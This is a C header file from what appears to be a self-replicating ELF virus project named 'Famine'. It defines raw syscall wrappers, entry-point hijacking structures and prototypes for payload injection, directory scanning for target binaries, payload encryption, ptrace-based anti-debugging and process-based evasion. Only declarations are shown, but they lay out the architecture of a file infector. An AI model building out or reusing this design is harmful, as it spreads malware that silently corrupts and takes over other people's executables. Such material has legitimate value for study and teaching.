#ifndef FT_VIRUS_H
# define FT_VIRUS_H

# include <elf.h>
# include "./struct.h"

# define SYS_READ 0
# define SYS_WRITE 1
# define SYS_OPEN 2
# define SYS_CLOSE 3
# define SYS_FSTAT 5
# define SYS_LSEEK 8
# define SYS_MMAP 9
# define SYS_MUNMAP 11
# define SYS_GETPID 39
# define STUB_FORK 57
# define SYS_EXIT 60
# define SYS_WAIT4 61
# define SYS_KILL 62
# define SYS_READLINK 89
# define SYS_PTRACE 101
# define SYS_GETUID 102
# define SYS_GETDENTS64 217
# define SYS_GETRANDOM 318

# define O_RDONLY 0
# define O_WRONLY 1
# define O_RDWR 2
# define O_DIRECTORY 0x10000

# define DT_REG 8
# define MAP_SHARED 1
# define PROT_READ 1
# define PROT_WRITE 2
# define MAP_FAILED ((void *)-1)
# define PTRACE_TRACEME 0
# define PTRACE_DETACH 17
# define PTRACE_ATTACH 16
# define NULL ((void*)0)
# define SIGSTOP 19

/* lseek */
# define SEEK_SET 0
# define SEEK_CUR 1
# define SEEK_END 2


/* config */
# define PROC_DODGE "man"

# define SIGNATURE "Famine version 1.0 (c)oded by gmorer-rcarette"

# define FORCE_INLINE __attribute__((always_inline)) inline

# define WRITE(fd, buffer, len) syscall3(SYS_WRITE, (u64)fd, (u64)buffer, (u64)len)
# define READ(fd, buffer, len) syscall3(SYS_READ, (u64)fd, (u64)buffer, (u64)len)
# define OPEN(pathname, flags) syscall2(SYS_OPEN, (u64)pathname, (u64)flags)
# define FSTAT(fildes, buf) syscall2(SYS_FSTAT, (u64)fildes, (u64)buf)
# define CLOSE(fd) syscall1(SYS_CLOSE, (u64)fd)
# define EXIT(code) syscall1(SYS_EXIT, (u64)code)
# define MMAP(addr, len, prot, flags, fildes, off) syscall6(SYS_MMAP, (void*)addr, (size_t)len, (int)prot, (int)flags, (int)fildes, (int)off)
# define MUNMAP(addr, length) syscall1(SYS_MUNMAP, (u64)addr, (u64)length)
# define LSEEK(fd, offset, whence) syscall3(SYS_LSEEK, (u64)fd, (u64)offset, (u64)whence)
# define GETDENTS64(fd, dirp, count) syscall3(SYS_GETDENTS64, (u64)fd, (u64)dirp, (u64)count)
# define READLINK(pathname, buff, buffsize) syscall3(SYS_READLINK, (u64)pathname, (u64)buff, (size_t)buffsize)
# define PTRACE(request, pid, addr, data) syscall4(SYS_PTRACE, (u64)request, (u64)pid, (u64)addr, (u64)data)
# define GETPID() syscall0(SYS_GETPID)
# define FORK() syscall0(STUB_FORK)
# define GETRANDOM(buf, buflen, flags) syscall3(SYS_GETRANDOM, (u64)buf, (u64)buflen, (u64)flags)
# define KILL(pid, sig) syscall2(SYS_KILL, (u64)pid, (u64)sig)
# define WAIT4(pid, wstatus, options, rusage) syscall4(SYS_WAIT4, (u64)pid, (u64)wstatus, (u64)options, (u64)rusage)

typedef struct	s_static
{
	size_t pl_size;

}				t_static;

typedef struct s_binary
{
	size_t old_entry;
	size_t new_entry;
	size_t new_pentry;
	size_t v_addr;
	size_t file_size;
}				t_binary;

typedef struct	s_data
{
	int fd;
	int virt_addr;
	int	key;
	int	decrypt_start;
	t_binary bin;
	t_static infos;
}		t_data;

/* syscalls.c */
u64	syscall0(int syscall);
u64	syscall1(int syscall, u64 arg1);
u64	syscall2(int syscall, u64 arg1, u64 arg2);
u64	syscall3(int syscall, u64 arg1, u64 arg2, u64 arg3);
u64	syscall4(int syscall, u64 arg1, u64 arg2, u64 arg3, u64 arg4);

/* biin_infos */
t_binary get_infos(int fd);

/* main.c */
void payload_start(void);
void payload_end(void);
void payload(void);

/* inject.c */
int inject(t_data data);

/* binary_finder.c */
int finder(t_data data, int fd, char *dir);

/* lib.c */
size_t	ft_strlen(char *str);
int	ft_memcmp(char *str1, char *str2, size_t len);
void	*ft_memcpy(char *dest, char *src, size_t len);

/* get_rel_addr.s */
u64 get_rel_addr();

/* process.c */
int is_proc_actif(void);

/* crypto.c */
void decrypt();
char encrypt(int fd);

#endif
